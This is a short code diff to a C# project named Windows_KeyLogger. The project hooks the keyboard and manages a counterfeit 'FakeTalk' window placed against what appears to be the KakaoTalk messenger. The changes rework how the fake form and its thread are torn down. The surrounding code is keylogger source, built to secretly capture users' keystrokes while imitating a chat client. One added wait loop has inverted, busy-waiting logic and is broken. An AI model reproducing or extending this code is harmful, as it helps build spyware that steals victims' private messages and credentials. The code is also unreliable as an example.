@@ -47,6 +47,8 @@ namespace Windows_KeyLogger
             InitializeComponent();
             hooker = new KeyboardHook(this);
             InitDictionary();
+            fakeForm = null;
+            t1 = null;
         }
 
 
@@ -192,10 +194,15 @@ namespace Windows_KeyLogger
             }
             else
             {
-                t1.Interrupt();
-                t1 = null;
-                fakeForm.Hide();
+                fakeForm.Close();
                 fakeForm = null;
+                t1.Interrupt();
+                while(!t1.IsAlive)
+                {
+
+                }
+                t1 = null;
+
             }
 
         }
@@ -213,7 +220,7 @@ namespace Windows_KeyLogger
             Process[] processlist = Process.GetProcesses();
 
             formhWnd = FindWindow(null, "FakeTalk");
-            while (true)
+            while (fakeForm != null)
             {
                 if(kakaohWnd != 0)
                 {
